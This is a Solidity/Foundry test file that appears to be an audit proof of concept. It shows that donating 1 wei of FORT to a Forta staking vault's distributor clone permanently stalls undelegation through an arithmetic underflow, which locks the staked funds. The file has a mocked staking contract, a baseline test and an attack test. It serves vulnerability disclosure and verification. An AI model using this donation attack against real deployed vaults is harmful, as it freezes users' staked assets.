// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC1155 } from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import { Clones } from "@openzeppelin/contracts/proxy/Clones.sol";
import { IFortaStaking, DELEGATOR_SCANNER_POOL_SUBJECT } from "../src/interfaces/IFortaStaking.sol";
import { FortaStakingUtils } from "../src/utils/FortaStakingUtils.sol";
import { FortaStakingVault } from "../src/FortaStakingVault.sol";
import { InactiveSharesDistributor } from "../src/InactiveSharesDistributor.sol";
import { RedemptionReceiver } from "../src/RedemptionReceiver.sol";

/// @dev Real FORT token: a plain ERC20 the protocol treats as an opaque asset.
contract MockFORT is ERC20 {
    constructor() ERC20("Forta", "FORT") { }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Faithful minimal representation of the *external* FortaStaking core.
/// @dev The real FortaStaking is a huge upgradeable ERC1155 (solc 0.8.9) that
///      the project's own tests reach only via a Polygon mainnet fork
///      (`vm.createSelectFork("polygon", ...)` against 0xd286...6874). It is out
///      of the audited scope. For a local, fork-free deploy we model only the
///      boundary behaviour the vulnerable path in the AUDITED contracts relies
///      on, mirroring the real semantics 1:1 (no slashing => shares == stake):
///        - deposit()          mints active ERC1155 shares 1:1 to the depositor
///        - safeTransferFrom()  real ERC1155 transfer (vault -> distributor)
///        - initiateWithdrawal() burns the caller's active shares, arms a delay,
///                               returns a deadline (mirrors FortaStaking)
///        - withdraw()          after the delay, transfers the staked FORT to
///                               the caller and RETURNS the exact amount
///      Crucially, `withdraw()` returns the true amount; the bug is that the
///      audited InactiveSharesDistributor ignores this return value and instead
///      trusts its own FORT *balance*, which anyone can inflate by donation.
contract MinimalFortaStaking is ERC1155 {
    IERC20 public immutable fort;
    uint64 public immutable withdrawalDelay;

    // key = keccak(staker, subject) -> pending stake to be released on withdraw
    mapping(bytes32 => uint256) public pendingStake;
    mapping(bytes32 => uint64) public pendingDeadline;

    constructor(IERC20 fort_, uint64 delay_) ERC1155("") {
        fort = fort_;
        withdrawalDelay = delay_;
    }

    function _key(address staker, uint256 subject) internal pure returns (bytes32) {
        return keccak256(abi.encode(staker, subject));
    }

    function deposit(uint8 subjectType, uint256 subject, uint256 stakeValue) external returns (uint256) {
        fort.transferFrom(msg.sender, address(this), stakeValue);
        uint256 activeId = FortaStakingUtils.subjectToActive(subjectType, subject);
        _mint(msg.sender, activeId, stakeValue, ""); // shares == stake (no slashing)
        return stakeValue;
    }

    function initiateWithdrawal(uint8 subjectType, uint256 subject, uint256 sharesValue) external returns (uint64) {
        uint256 activeId = FortaStakingUtils.subjectToActive(subjectType, subject);
        uint256 bal = balanceOf(msg.sender, activeId);
        uint256 shares = sharesValue < bal ? sharesValue : bal;
        _burn(msg.sender, activeId, shares);

        bytes32 k = _key(msg.sender, subject);
        pendingStake[k] += shares; // 1:1 stake
        uint64 deadline = uint64(block.timestamp) + withdrawalDelay;
        pendingDeadline[k] = deadline;
        return deadline;
    }

    function withdraw(uint8, uint256 subject) external returns (uint256) {
        bytes32 k = _key(msg.sender, subject);
        require(block.timestamp >= pendingDeadline[k], "WithdrawalNotReady");
        uint256 amount = pendingStake[k];
        pendingStake[k] = 0;
        fort.transfer(msg.sender, amount); // returns the TRUE amount released
        return amount;
    }

    // ---- views used by the audited vault (1:1, no slashing) ----
    function activeSharesToStake(uint256, uint256 amount) external pure returns (uint256) {
        return amount;
    }

    function inactiveSharesToStake(uint256, uint256 amount) external pure returns (uint256) {
        return amount;
    }

    function sharesOf(uint8 subjectType, uint256 subject, address account) external view returns (uint256) {
        return balanceOf(account, FortaStakingUtils.subjectToActive(subjectType, subject));
    }

    function isFrozen(uint8, uint256) external pure returns (bool) {
        return false;
    }
}

contract PoC_32467 is Test {
    using Clones for address;

    uint256 internal constant SUBJECT = 55;
    uint256 internal constant STAKE = 100 ether;
    uint64 internal constant DELAY = 10;
    address internal constant ATTACKER = address(0xA11CE);

    MockFORT internal fort;
    MinimalFortaStaking internal staking;
    FortaStakingVault internal vaultImplementation;
    InactiveSharesDistributor internal distributorImplementation;
    RedemptionReceiver internal receiverImplementation;

    function _deployVault() internal returns (FortaStakingVault vault) {
        vaultImplementation = new FortaStakingVault();
        distributorImplementation = new InactiveSharesDistributor();
        receiverImplementation = new RedemptionReceiver();

        vault = FortaStakingVault(address(vaultImplementation).clone());
        vault.initialize(
            address(fort),
            address(staking),
            address(receiverImplementation),
            address(distributorImplementation),
            0, // no operator fee
            address(this), // fee treasury
            address(0) // rewards distributor (unused)
        );

        // Operator funds the vault and delegates the whole balance to SUBJECT.
        fort.mint(address(vault), STAKE);
        vault.delegate(SUBJECT, STAKE);
    }

    function setUp() public {
        fort = new MockFORT();
        staking = new MinimalFortaStaking(fort, DELAY);
    }

    /// @notice CONTROL: with no interference the two-step undelegation completes
    ///         and the vault reclaims exactly its staked FORT. This proves the
    ///         happy path works and isolates the donation as the sole cause of
    ///         the stall in the attack test below.
    function test_baseline_undelegate_succeeds_without_donation() public {
        FortaStakingVault vault = _deployVault();

        (uint256 deadline, address distributor) = vault.initiateUndelegate(SUBJECT, STAKE);
        assertEq(fort.balanceOf(address(vault)), 0, "vault balance drained into staking after delegate");
        assertEq(staking.pendingStake(keccak256(abi.encode(distributor, SUBJECT))), STAKE, "withdrawal armed");

        vm.warp(deadline + 1);

        vault.undelegate(SUBJECT);

        // Vault reclaimed exactly its stake; nothing stranded in the distributor.
        assertEq(fort.balanceOf(address(vault)), STAKE, "vault reclaimed full stake");
        assertEq(fort.balanceOf(distributor), 0, "distributor emptied");
    }

    /// @notice ATTACK: anyone donates FORT to the freshly-cloned distributor.
    ///         InactiveSharesDistributor.undelegate() forwards its whole FORT
    ///         *balance* (stake + donation) to the vault, so the vault tries to
    ///         subtract more than `_assetsPerSubject[SUBJECT]` and reverts with
    ///         an arithmetic underflow. The undelegation is permanently stalled
    ///         and the staked FORT is trapped in the distributor.
    function test_attack_donation_permanently_stalls_undelegation() public {
        FortaStakingVault vault = _deployVault();

        (uint256 deadline, address distributor) = vault.initiateUndelegate(SUBJECT, STAKE);

        // 1 wei of FORT is enough to break the accounting.
        uint256 donation = 1 wei;
        fort.mint(ATTACKER, donation);
        vm.prank(ATTACKER);
        fort.transfer(distributor, donation);

        vm.warp(deadline + 1);

        bytes32 withdrawalKey = keccak256(abi.encode(distributor, SUBJECT));

        // The withdraw itself would release exactly STAKE, but the distributor
        // trusts its inflated balance -> vault underflows on subtraction.
        vm.expectRevert(stdError.arithmeticError);
        vault.undelegate(SUBJECT);

        // HARM 1: the ONLY path that can complete the withdrawal (undelegate,
        // which drives distributor.undelegate() -> staking.withdraw()) reverts,
        // so the vault reclaims nothing and the STAKE is stuck as an
        // un-completable pending withdrawal inside FortaStaking.
        assertEq(fort.balanceOf(address(vault)), 0, "vault reclaimed nothing");
        assertEq(staking.pendingStake(withdrawalKey), STAKE, "STAKE locked as un-completable withdrawal");
        assertEq(fort.balanceOf(address(staking)), STAKE, "STAKE physically held by staking, unreachable");
        assertEq(fort.balanceOf(distributor), donation, "attacker donation lodged in distributor");

        // HARM 2: the stall is permanent - the donation is already inside the
        // distributor and cannot be removed through the normal flow, so every
        // future undelegate() for this subject reverts the same way regardless
        // of how much time passes. No permissionless recovery exists.
        vm.warp(deadline + 1_000_000);
        vm.expectRevert(stdError.arithmeticError);
        vault.undelegate(SUBJECT);

        assertEq(staking.pendingStake(withdrawalKey), STAKE, "STAKE still locked after retry");
        assertEq(fort.balanceOf(address(vault)), 0, "vault still reclaimed nothing");
    }
}
